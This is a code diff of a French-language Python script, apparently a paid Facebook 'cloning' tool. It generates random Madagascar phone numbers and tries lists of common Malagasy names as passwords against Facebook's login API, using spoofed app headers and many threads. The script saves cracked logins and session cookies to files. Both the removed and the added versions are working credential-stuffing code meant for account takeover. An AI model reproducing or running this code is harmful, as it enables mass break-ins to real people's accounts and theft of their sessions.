@@ -1,92 +1,182 @@
+# Définir le numéro de version
+version_actuelle = "2.0"
+
+
+
 import os
 import random
-import string
+import string 
 import uuid
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import json
+import subprocess
+from concurrent.futures import ThreadPoolExecutor as tred
 import requests
-from datetime import date, datetime
+import sys
+import secrets
+import getpass
 
-def menu_principal():
-    print(logo)
-    print("\x1b[38;5;155m➤  [1] CRACK MALAGASY ALÉATOIRE")
-    print("\x1b[38;5;155m➤ [2]Envoyer un message au développeur❤️👾")
-    print("\x1b[38;5;155m➤ [3]Groupe WhatsApp ❤️👾")
-    print("\x1b[38;5;155m➤ [4]Groupe Facebook ❤️👾")
-    print("\x1b[38;5;155m➤ [5]Compte ITACHI ❤️👾")
-    print("\x1b[38;5;155m➤ [2] QUITTER L'OUTIL ")
-    linex()
-    choix = input("\x1b[38;5;155m[➤] VOTRE CHOIX : ")
+# Mot de passe pour déverrouiller le script
+mot_de_passe = "ITACHI2024"
 
-    if choix == "1":
-        bhoot()
-    elif choix == "2":
-        os.system('xdg-open https://chat.whatsapp.com/BXZgnNPv6VwHxyzVEjWBBR')
-        input("Appuyez sur Entrée pour continuer...")
-        menu_principal()
-    elif choix == "3":
-        os.system('xdg-open https://chat.whatsapp.com/Kcj4CIXEgEcCeHGJpxaFYB')
-        input("Appuyez sur Entrée pour continuer...")
-        menu_principal()
-    elif choix == "4":
-        os.system('xdg-open https://facebook.com/groups/641144864016773/')
-        input("Appuyez sur Entrée pour continuer...")
-        menu_principal()
-    elif choix == "5":
-        os.system('xdg-open https://www.facebook.com/DIEU.ITACHI999')
-        input("Appuyez sur Entrée pour continuer...")
-        menu_principal()
-    elif choix == "6":
-        os.system('exit')
-    elif choix.lower() == "e":
-        os.system('exit')
-    else:
-        print("Choix invalide. Veuillez sélectionner une option valide.")
-        menu_principal()
+# Demander à l'utilisateur de saisir le mot de passe
+saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")
 
-def bhoot():
-    user = []
-    os.system("clear")
-    print(logo)
-    print("\x1b[38;5;155m[✧] CODE SIM : 26133,26132,26138,26134 ")
-    code = input("\x1b[38;5;155m[➤] VOTRE CHOIX : ")
-    os.system("clear")
-    print(logo)
-    print("\x1b[38;5;155m[✧] EXEMPLE DE LIMITE : 5000,10000,50000 ")
-    limit = int(input('\x1b[38;5;155m[➤] VOTRE CHOIX : '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as TANIM:
-        tl = str(len(user))
-        print('\x1b[38;5;155m[➤] \x1b[38;5;222mUTILISEZ LE MODE AVION APRÈS 2 MINUTES POUR OBTENIR PLUS D\'IDS OK <>~~~')
-        linex()
-        for love in user:
-            pwx = [love[2:], love, code + love, code + love[:3], 'bangladesh', 'free fire', 'je t\'aime', 'sadiya', 'mimmim', 'mababa', 'sarmin', 'riya123', 'yousha', 'sabbir', 'mehedi', 'tonmoy', 'ayesha', 'fuckyou', 'tammana', 'nishat', 'malala', 'mamako', 'Mamako', 'mamiko']
-            ids = code + love
-            TANIM.submit(api, ids, pwx, tl)
-    print('TOTAL OK \033[1;92m' + str(len(oks)))
-
-def api(ids, pwv, tl):
-    global loop, oks, cps, twf
-    sys.stdout.write(f'\r\x1b[38;5;155m[➤] RECHERCHE DE ITACHI~  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ')
-    sys.stdout.flush()
+# Vérifier si le mot de passe saisi est correct
+if saisie_mot_de_passe == mot_de_passe:
+    print("Mot de passe correct. Exécution de git pull...")
+    # Exécuter la commande git pull
     try:
-        for pas in pwv:
-            data = requests.get(f'https://graph.facebook.com/{ids}/?access_token={pas}')
-            z = json.loads(data.text)
-            if 'username' in z.keys():
-                print('\x1b[38;5;155m[✓] >> ' + ids + ' ✅ | ' + pas)
-                ok = open('hackedaccounts.txt', 'a')
-                ok.write(ids + ' | ' + pas + '\n')
-                ok.close()
-                oks.append(ids)
-                break
-            elif 'www.facebook.com' in z['error']['message']:
-                print('\x1b[38;5;155m[✘] >> ' + ids + ' ⚠️ | ' + pas)
+        subprocess.run(["git", "pull"], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Erreur lors de l'exécution de git pull : {e}")
+        exit(1)
+    print("Git pull terminé avec succès !")
+
+#-------------color----------------#
+bblack="\033[1;30m"         # Black
+M="\033[1;31m"            # Red
+H="\033[1;32m"         # Green
+byellow="\033[1;33m"        # Yellow
+bblue="\033[1;34m"          # Blue
+P="\033[1;35m"        # Purple
+C="\033[1;36m"          # Cyan
+B="\033[1;37m"         # White
+my_color = [
+ B,C,P,H]
+warna = random.choice(my_color)
+oks=[]
+cps=[]
+loop=0
+# Liste des couleurs pour le logo, les lignes et chaque mot
+logo_colors = [B, C, P, H]
+line_colors = [bblack, M, H, byellow, bblue, P, C, B]
+word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
+#-------------logo-----------------#
+logo=(f'''{B}
+
+
+                                 
+,--.  ,--.,------.,--.,--.  ,--. 
+|  ,'.|  ||  .---'|  ||  ,'.|  | 
+|  |' '  ||  `--, |  ||  |' '  | 
+|  | `   ||  `---.|  ||  | `   | 
+`--'  `--'`------'`--'`--'  `--' 
+                                 
+
+                                            
+
+{warna}--------------------------------------------{B}
+ Owner    : {M}SAFIDINIAINA{M}
+ TOOL NAME : {warna}{P}SAFIDY{P}{warna}
+ GROUPE-FB   : NONE 
+ STATUE : {H}PAID{H}
+ Facebook : {bblue}SM{bblue}
+ Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
+--------------------------------------------{B}''')
+#-------------linex def -------------#
+def linex():
+    print(f'{warna}--------------------------------------------{B}')
+#-------------clear def -------------#
+def clear():
+    os.system('clear')
+    print(logo)
+#-------------main def------------#
+def MR_ITACHI():
+    clear()
+    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
+    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
+    linex()
+    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
+    if option in ['01','1']:
+        BD_CLONING()
+    else:
+        exit(' MERCI BEAUCOUP  :)')
+#------------- bd clone def ----------#
+def BD_CLONING():
+    user=[]
+    clear()
+    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
+    print(' 261=0 Madagascar : [032] [034] [038] [033]')
+    code=input(' ENTER SIM CODE >> ')
+    linex()
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(map(str, generate_random_sequence(7)))
+        user.append(nmp)
+    with tred(max_workers=80) as Dipto:
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' CLONING EN COURS ... ')
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'ambinintsoa','Ambinintsoa','andoniaina','Andoniaina','Fahendrena','andrianina','Andrianina','anjara','Anjara','avotra','Avotra','fanasina','baholy','Baholy','Bakoly','bakoly','bobota','Bobota','diary','Diary','domoina','Domoina','fanaja','Fanaja','Faneva','faneva','Fehizoro','fehizoro','Fenosoa','fenosoa','Haingo','haingo','hajatiana','Hajatiana','harena','Harena','harisoa','Harisoa','Henika','henika','henitsoa','Henitsoa','holisoa','Holisoa','johary','Johary','koloina','Koloina','lalaina','Lalaina','lovasoa','Lovasoa','mahandry','Mahandry','maholy','Maholy','mirana','Mirana','miaro','Miaro','navalona','Navalona','njaka','Njaka','onisoa','andriatsitohaina','Andriatsitohaina','Onisoa','rabary','Rabary','santatra','Santatra','Sahaza','sahaza','tsiresy','Tsiresy','tsiaro','Tsiaro','harena','Harena']
+            Dipto.submit(method_crack,ids,passlist)
+            
+    linex()
+    print(' LE CLONING EST FINI ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    MR_ITACHI()
+#------------ method crack def ---------#
+def method_crack(ids, passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://api.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[1;32m [COOKIES] '+coki)
+                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
+                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
+                        os.makedirs("/sdcard/SAFIDY-IDS")
+                    # Enregistrer dans le fichier SAFIDY-OK.txt
+                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
+                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
+                # Enregistrer dans le fichier SAFIDY-CP.txt
+                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
+                    f.write(ids+'|'+pas+'\n')
+                cps.append(ids)
                 break
             else:
                 continue
+        loop+=1
     except:
         pass
+#-------------end----------------#
 
-menu_principal()
+# Générateur de séquence aléatoire
+def generate_random_sequence(length):
+    sequence = [random.choice(string.digits) for _ in range(length)]
+    return sequence
+
+# Appel à la fonction MR_ITACHI pour démarrer le programme
+MR_ITACHI()
